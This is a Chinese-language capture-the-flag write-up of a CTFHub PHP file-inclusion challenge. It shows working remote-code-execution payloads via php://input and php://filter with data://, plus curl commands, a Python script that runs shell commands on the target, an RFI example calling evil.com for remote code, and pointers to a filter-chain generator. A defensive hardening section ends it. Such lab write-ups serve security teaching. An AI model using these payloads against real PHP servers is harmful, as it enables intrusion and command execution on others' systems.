---
layout: post
title: CTFHub - php://filter 伪协议 RCE Writeup
platform: ctfhub
date: 2026-10-23 19:13:00 +0800
categories: CTF
---

CTFHub - php://filter 伪协议 RCE Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件包含** → php://filter）
- 题型：Web
- 考点：**PHP 伪协议**（`php://input`、`php://filter`、`data://`）、`allow_url_include`


```text
★ 页面源码：

    <?php
    if (isset($_GET['file'])) {
        if (substr($_GET["file"], 0, 6) === "php://") {      // ★ 必须以 php:// 开头
            include($_GET["file"]);
        } else {
            echo "Hacker!!!";
        }
    } else {
        highlight_file(__FILE__);
    }
    ?>
    <hr>
    i don't have shell, how to get flag? <br>
    <a href="phpinfo.php">phpinfo</a>

    ★ 提示：没有 shell.txt，只有 phpinfo
    ★ 限制：只能用 php:// 开头的路径

★ phpinfo 里的关键配置（成败的关键）：

    allow_url_include  = On        ★★★ 这决定了能不能用 data:// 和 php://input
    allow_url_fopen    = On
    open_basedir       = no value  （没限制目录）
    disable_functions  = no value  （没禁用函数）
    PHP_VERSION        = 5.6.40
    DOCUMENT_ROOT      = /var/www/html

★ 尝试 1：php://input + POST body  → ✅ 成功

    POST /?file=php://input
    Content-Type: text/plain

    <?php system('id'); ?>

    → uid=33(www-data) gid=33(www-data) groups=33(www-data)

★ 尝试 2：php://filter + data:// → ✅ 成功（纯 GET，更简单）

    ?file=php://filter/resource=data://text/plain,<?php system('id');?>

    → uid=33(www-data) gid=33(www-data) groups=33(www-data)

★ 尝试 3：base64 版本 → ❌ 失败

    php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHA...
    → 乱码
    ★ 原因：data://text/plain;base64, 自己已经解码了一次，
      convert.base64-decode 又解一次 → 双重解码 → 乱码

★ 找 flag：

    ?file=php://filter/resource=data://text/plain,<?php system('ls -la /');?>
    → -rw-r--r-- 1 root root 33 flag_27298     ← ★ 根目录

    ?file=php://filter/resource=data://text/plain,<?php system('cat /flag_27298');?>
    → ctfhub{310e8aa353d6f1ca8d13f8e2}

flag         : ctfhub{310e8aa353d6f1ca8d13f8e2}
```

二、题目分析

**① 这道题的难点：只能用 `php://`**

```php
if (substr($_GET["file"], 0, 6) === "php://") {
    include($_GET["file"]);
} else {
    echo "Hacker!!!";
}
```

**`substr($file, 0, 6)` 取前 6 个字符**：

```
"php://filter/..."   → 前 6 字符 = "php://"  ✅ 通过
"data://text/..."    → 前 6 字符 = "data:/"  ❌ 拦截
"php://input"        → 前 6 字符 = "php://"  ✅ 通过
"/etc/passwd"        → 前 6 字符 = "/etc/p"  ❌ 拦截
"../../etc/passwd"   → 前 6 字符 = "../../"  ❌ 拦截
```

**所以**：

```
❌ 不能用路径穿越读 /etc/passwd
❌ 不能直接用 data:// 
❌ 不能包含普通文件

✅ 只能用 php:// 系列包装器
```

**② phpinfo 为什么是"白给的关键"**

**在 php:// 系列里，能不能 RCE 取决于 `allow_url_include`**：

```
allow_url_include = On   → include 可以包含 URL 类流（data://、php://input）→ 能 RCE
allow_url_include = Off  → 只能本地文件流 → 需要更复杂的技术
```

**★ 所以题目给你 phpinfo，就是让你去查这个配置。**

**必须查的几个配置**：

| 配置 | 作用 | 影响 |
|---|---|---|
| **`allow_url_include`** | 能否 include URL | **决定能否直接 RCE** |
| `allow_url_fopen` | 能否 fopen URL | 影响 `file_get_contents` |
| `open_basedir` | 文件访问限制 | 限制能读哪些目录 |
| `disable_functions` | 禁用函数 | 限制能不能执行命令 |
| `PHP_VERSION` | 版本 | 影响可用技术 |

**③ 方法一：`php://input`（POST）**

```php
include('php://input');
```

**`php://input` 是什么**：

```
一个只读流，内容是【HTTP 请求体的原始数据】

    POST /?file=php://input
    Content-Type: text/plain
    
    <?php system('id'); ?>          ← 这段就是 php://input 的内容

include('php://input')
    → 读取请求体 → 得到 "<?php system('id'); ?>"
    → 当作 PHP 代码解析执行 → RCE
```

**★ 关键细节**：

```
Content-Type 必须【不是】 application/x-www-form-urlencoded
    → 因为那样 PHP 会先把 body 解析成 $_POST
    → php://input 就读不到了（PHP 5.6 之前会被消费掉）

用 Content-Type: text/plain 最稳
```

**④ 方法二：`php://filter` + `data://`（纯 GET）**

```php
?file=php://filter/resource=data://text/plain,<?php system('id');?>
```

**逐段拆解**：

```
php://filter/                     ← 用 filter 包装器
    resource=                     ← 指定"数据源"
        data://text/plain,        ← data 包装器，内容是后面的明文
            <?php system('id');?>  ← 真正要执行的 PHP 代码
```

**工作原理**：

```
① include 请求 php://filter 流
② php://filter 去读它的 resource，即 data://text/plain,<?php ...?>
③ data:// 返回那段明文（因为 allow_url_include=On）
④ php://filter 没有指定过滤器 → 原样传递
⑤ include 拿到内容 → 当 PHP 代码解析 → 执行
```

**★ 这个方法的优势**：

```
· 纯 GET 请求（不需要 POST）
· 一个 URL 就能打
· 浏览器地址栏直接输就行
```

**⑤ 为什么 base64 版本失败**

```
我试的：
    php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHA...

流程：
    ① data://text/plain;base64,PD9waHA... 
       → data 包装器【先】把 base64 解码成 "<?php system('id');?>"
    ② php://filter 的 convert.base64-decode 
       → 又把 "<?php system('id');?>" 当 base64 解一次
       → 得到乱码
    ③ include 乱码 → 不执行

★ 教训：不要叠加两层解码
★ 正确用法（二选一）：
    data://text/plain,<?php ...?>                                  （明文，不解码）
    php://filter/convert.base64-decode/resource=data://text/plain;base64,<b64>  ❌ 不行
    改成：resource=php://temp 或者其他不带 base64 的 data URI
```

**⑥ 如果 `allow_url_include = Off` 怎么办**

**那就不能直接用 data:// 和 php://input 了**，需要更高级的技术：

**（1）php filter chain（PHP 过滤器链）**

```
原理：用一串 convert.iconv.* 过滤器，把任意文件"变形"成任意内容
     → 能在 allow_url_include=Off 的情况下生成 PHP 代码

工具：php_filter_chain_generator
    https://github.com/synacktiv/php_filter_chain_generator

用法：
    python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
    → 生成一长串 php://filter/convert.iconv.../resource=php://temp
    
★ 这是 2023 年公开的技术，需要 PHP 的 iconv 扩展
```

**（2）读文件（不需要 RCE）**

```
?file=php://filter/convert.base64-encode/resource=flag.php
→ 把 flag.php 的内容 base64 编码后输出
→ 你解码就能看到源码

★ 如果 flag 在某个文件的源码里，这样就能直接拿到
★ 本题的 flag 在 /flag_27298（纯文本），所以还是要 RCE
```

**（3）php://filter 的其他过滤器组合**

```
· convert.base64-encode     读源码
· convert.iconv.UTF8.UTF7   编码转换（能绕过某些过滤）
· string.strip_tags         去掉 HTML 标签
· zlib.deflate / inflate    压缩解压
```

三、解题步骤

**第 1 步：看源码，确认限制**

```
访问首页（不带参数）→ highlight_file 显示源码

    if (substr($_GET["file"], 0, 6) === "php://") {
        include($_GET["file"]);
    }

★ 只能用 php:// 开头
★ 提示：没有 shell，只有 phpinfo
```

**第 2 步：看 phpinfo，找 `allow_url_include`**

```
访问 /phpinfo.php
Ctrl+F 搜 "allow_url_include"

→ allow_url_include = On      ★ 可以用 data:// 和 php://input
```

**如果搜到 Off**：

```
→ 换思路：php filter chain、或者只用 php://filter 读源码
```

**第 3 步：RCE（方法一：php://input）**

**用 Burp**：

```
① Burp → Repeater
② 请求：

    POST /?file=php://input HTTP/1.1
    Host: challenge-xxx:10800
    Content-Type: text/plain
    Content-Length: 24

    <?php system('id'); ?>

③ Send
④ 响应里看到：uid=33(www-data)...
```

**用 curl**：

```bash
curl -X POST "http://challenge-xxx:10800/?file=php://input" \
     -H "Content-Type: text/plain" \
     --data '<?php system("id"); ?>'
```

**★ 注意 `--data` 会设置 Content-Type 为 form-urlencoded，
所以必须显式 `-H "Content-Type: text/plain"`。**

**第 4 步：RCE（方法二：php://filter + data://）**

**浏览器直接输**：

```
http://challenge-xxx:10800/?file=php://filter/resource=data://text/plain,<?php system('id');?>
```

**★ 浏览器会自动编码 `<?php` 里的特殊字符吗？**

```
· `<` `>` `?` `(` `)` `'` `;` 在 query string 里是合法字符
· 浏览器通常原样发送
· 但为了保险，可以用 Burp 或 curl 发编码后的版本
```

**用 curl（更稳）**：

```bash
curl -G "http://challenge-xxx:10800/" \
     --data-urlencode 'file=php://filter/resource=data://text/plain,<?php system("ls -la /"); ?>'
```

**★ `--data-urlencode` 会自动编码参数值。**

**第 5 步：找 flag**

```
?file=php://filter/resource=data://text/plain,<?php system('ls -la /');?>
→ -rw-r--r-- 1 root root 33 flag_27298

?file=php://filter/resource=data://text/plain,<?php system('cat /flag_27298');?>
→ ctfhub{310e8aa353d6f1ca8d13f8e2}
```

**第 6 步：提交 → 通关**

---

**自动化脚本**

```python
import ssl, urllib.parse, urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"
OPEN = "<" + "?" + "php "
CLOSE = "?" + ">"


def run(cmd):
    php = OPEN + "system('%s');" % cmd + CLOSE
    payload = "php://filter/resource=" + urllib.parse.quote("data://text/plain," + php, safe="")
    u = BASE + "/?file=" + payload
    with urllib.request.urlopen(u, context=CTX, timeout=20) as r:
        return r.read().decode('utf-8', 'replace').split("<hr>")[0].strip()


print(run("ls -la /"))
print(run("cat /flag_27298"))
```

**★ 关键就是 `urllib.parse.quote(..., safe="")`** —— 把 `?`、`(`、`)`、`'`、`;` 都编码掉。

---

**手工验证清单**

```
① 首页看源码 → 确认只能用 php:// 
② /phpinfo.php → 搜 allow_url_include
   · On  → 试 php://input 或 data://
   · Off → 用 php filter chain 或只读文件
③ 先用 system('id') 验证 RCE
④ 再 system('ls -la /') 找 flag
⑤ cat 它
```

四、延伸知识

**① PHP 的伪协议（wrapper）全表**

| 协议 | 读/写 | 需要条件 | 用途 |
|---|---|---|---|
| `file://` | 读写 | 无 | 读本地文件 |
| `php://filter` | 读 | 无 | **读源码、编码转换** |
| `php://input` | 读 | `allow_url_include=On` | **读 POST body（RCE）** |
| `php://stdin/stdout` | 读写 | CLI 模式 | 命令行 |
| `php://memory` / `php://temp` | 读写 | 无 | 内存流 |
| `php://fd` | 读写 | 无 | 文件描述符 |
| `data://` | 读 | `allow_url_include=On` | **内联数据（RCE）** |
| `http://` / `https://` | 读 | `allow_url_include=On` | **远程包含（RFI）** |
| `ftp://` | 读 | 同上 | RFI 变体 |
| `phar://` | 读 | 无（PHP 8 前） | **反序列化** |
| `zip://` | 读 | 需要 zip 扩展 | 读压缩包内文件 |
| `compress.zlib://` | 读写 | zlib 扩展 | 压缩流 |
| `expect://` | 读写 | expect 扩展 | **直接执行命令** |
| `glob://` | 读 | 无 | 列目录 |

**★ 本题用到：`php://filter` + `php://input` + `data://`**

**② `php://filter` 的语法**

```php
php://filter/[读过滤器]/[写过滤器]/resource=<目标>

例子：
    php://filter/convert.base64-encode/resource=index.php
        └──┬──┘ └──────────┬──────────┘└───┬───┘
        协议      读过滤器（编码）        资源
```

**常用过滤器**：

```php
convert.base64-encode / convert.base64-decode     Base64
convert.quoted-printable-encode / -decode         引号可打印
convert.iconv.<from>.<to>                         编码转换
string.rot13                                      ROT13
string.toupper / string.tolower                   大小写
string.strip_tags                                去 HTML 标签
zlib.deflate / zlib.inflate                       压缩
```

**③ `php://filter` 的经典组合：读源码**

```php
// 直接 include 一个 .php 会执行它，你看不到源码
?file=index.php
→ 执行 index.php（可能什么都没有）

// 用 filter 编码后，源码变成 Base64 字符串输出
?file=php://filter/convert.base64-encode/resource=index.php
→ PD9waHAg...  （Base64，解码就是源码）✅
```

**④ `php_filter_chain` 技术（2023，进阶）**

**背景**：

```
当 allow_url_include = Off 时：
    data://     ❌ 不能用
    php://input ❌ 不能用
    
只剩 php://filter（本地流）→ 看起来只能读文件
```

**突破**：

```
php://filter 的 convert.iconv.* 能"改变字符串内容"

人类发现了：一串精心的 iconv 转换，能把【任意文件】的前缀
            变成【任意内容】（包括 PHP 代码）

原理（简化）：
    利用 UTF-8/UTF-7/UTF-16 等编码之间的转换，
    让某些字节被丢弃/替换，最终拼出想要的字符串

工具：
    https://github.com/synacktiv/php_filter_chain_generator

用法：
    python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
    
    输出：
    php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
    convert.iconv.UTF8.UTF7|convert.iconv...|resource=php://temp

★ 直接把这一长串塞进 ?file= → RCE
★ 需要 iconv 扩展（大多数 PHP 都有）
```

**⑤ RFI（远程文件包含）**

```php
?file=http://evil.com/shell.txt
```

**条件**：

```
allow_url_include = On
allow_url_fopen = On
```

**攻击方式**：

```
① 在自己服务器上放 shell.txt（内容是 PHP 代码）
② 目标 include 你的 URL
③ 代码在目标服务器上执行
```

**★ 本题的 `data://` 是 RFI 的"免服务器版"** —— 不用真的起服务器。

**⑥ 防护**

```text
① ★ 白名单（最有效）
    $allow = ['home', 'about', 'contact'];
    if (!in_array($_GET['page'], $allow)) die();

② ★ allow_url_include = Off（默认就是 Off，别开）
③ ★ allow_url_fopen = Off（如果不需要远程读文件）
④ ★ open_basedir 限制目录
    open_basedir = /var/www/html

⑤ 过滤危险字符（`..`、`/`、`php://`、`data://`）
    （黑名单容易被绕，白名单更好）

⑥ 上传目录禁止执行
⑦ 不要用用户输入拼 include 路径
```

**⑦ 这题的"信息泄露"链条**

```
① 首页 highlight_file → 泄露源码（知道只能用 php://）
② phpinfo.php → 泄露配置（知道 allow_url_include=On）
③ 两者结合 → 确定用 data:// / php://input

★ 实战中，phpinfo 暴露是严重的信息泄露
  （它暴露 PHP 版本、配置、路径、甚至环境变量/密钥）
```

五、总结

- **本题核心：只能用 `php://`，但 `allow_url_include=On` → 用 `php://input` 或 `php://filter`+`data://` 实现 RCE。**
- 两个可用 payload：

```
① POST /?file=php://input     （body 是 PHP 代码，Content-Type: text/plain）

② ?file=php://filter/resource=data://text/plain,<?php system('id');?>
```

- **三个必记要点**：

```text
① phpinfo 是金矿 —— allow_url_include 决定能不能直接 RCE
② php://filter 的 resource 可以是 data://，这样绕过"只能 php://"的限制
③ php://input 读的是原始请求体，Content-Type 不能用 form-urlencoded
```

- **实测 flag**：

```text
ctfhub{310e8aa353d6f1ca8d13f8e2}
（在 /flag_27298）
```

**手工复现要点**：

```text
· 首页看源码 → 确认前缀限制
· phpinfo 搜 allow_url_include
· On  → 二选一：
    POST ?file=php://input + body
    GET  ?file=php://filter/resource=data://text/plain,<?php system('cmd');?>
· Off → 用 php filter chain 生成器
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  php://input     = "把 POST body 当成一个文件来 include" │
│  data://         = "把字符串当成一个文件来 include"      │
│  php://filter    = "读一个资源，然后按规则变形再给你"    │
│                                                        │
│  三者的共同杀手锏：allow_url_include = On                │
│  ★ 这个配置一旦开启，文件包含基本等于 RCE                │
└────────────────────────────────────────────────────────┘
```
